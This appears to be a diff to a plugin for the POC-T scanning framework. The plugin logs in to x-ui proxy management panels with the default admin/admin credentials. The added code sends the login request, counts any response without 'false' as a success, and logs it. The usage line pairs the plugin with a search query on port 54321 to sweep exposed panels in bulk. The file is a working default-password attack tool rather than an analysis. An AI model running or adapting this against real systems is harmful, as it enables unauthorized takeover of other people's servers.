@@ -1,48 +1,39 @@
 #!/usr/bin/env python
 # -*- encoding: utf-8 -*-
 '''
-@File    :   xui-ssr-weak-pass.py.py    
+@File    :   ssr-xui_weak_pass.py.py
 @DateTime :  2023/3/11 18:01
 @Usage:
-
+    python2 POC-T.py -s ssr-xui_weak_pass.py -aF "port=54321 && body='xui'"
 
 '''
 
-import requests
-
-from utils.versioncheck import PYVERSION
-
-
-def get_schemed_url(url):
-    schemed_url = url if '://' in url else 'http://' + url
-    return schemed_url
+from lib.utils.http import request, get_schemed_url, urljoin_ex
+from lib.core.data import logger
 
 
-def urljoin_ex(url, path):
-    try:
-        if PYVERSION >= "3.0":
-            from urllib.parse import urljoin
-        else:
-            from urlparse import urljoin
-
-        return urljoin(url, path)
-
-    except:
-        return url.rstrip('/') + "/" + path.lstrip("/")
-
-password = ""
-
-def _get_post_data(pwd):
+def _get_post_data(pwd="admin"):
+    pwd = pwd.strip()
     post_data = {
         "username": "admin",
-        "password": "admin"
+        "password": pwd
     }
+    return post_data
 
 
 def poc(url):
     url = get_schemed_url(url)
-    login_url = urljoin_ex(url, "login")
+    login_url = urljoin_ex(url, "/login")
 
+    # 1
+    post_data = _get_post_data()
+    resp = request("POST", login_url, json=post_data, verify=0, timeout=15)
+    if not resp:
+        return False
 
-    r = requests.post(login_url, )
-    return True
+    if "false" in resp.text:
+        return False
+
+    else:
+        logger.info(resp.text)
+        return True
